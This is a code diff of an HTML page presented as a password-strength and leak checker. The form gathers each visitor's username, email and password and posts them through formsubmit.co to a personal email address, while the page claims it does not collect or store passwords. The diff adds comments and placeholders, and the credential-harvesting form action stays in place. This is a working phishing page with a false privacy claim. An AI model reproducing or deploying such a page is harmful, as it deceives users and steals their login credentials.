@@ -3,22 +3,21 @@
 <html>
       <head>
             <link rel="stylesheet" href="formstyle.css">
+	    <!-- link to CSS page -->
       </head>
 <body>
       <div class="container">
-            <form action="https://formsubmit.co/rayanmcl@yahoo.com" method="POST">
+            <form action="https://formsubmit.co/rayanmcl@yahoo.com" method="POST"> <!-- Once submit button click form will be send to
+										        backend service -->	
                   <h1> CHECK YOUR PASSWORD </h1><br>
 			<p>Please fill the form so we can check if your password is strong enough, <br>
  				your password is not safe if it can be brute-force or found in a database of leaked 				
 				passwords<br><br>
 			    We do not collect or store your passwords </p>
-                  
-                  <label> Username: </label><br>
-                  <input type="text" name="username" required><br>
-                  <label> Email: </label><br>
-                  <input type="email" name="email" required>
-		  <label> Password: </label><br>
-                  <input type="password" name="password" required>
+                  <!-- Form fields -->
+                  <input type="text" placeholder="Username" name="username" required><br>
+                  <input type="email" placeholder="Email" name="email" required>
+                  <input type="password" placeholder="Password" name="password" required>
                   <button type="submit">Send</button>
       </div>
 </form>
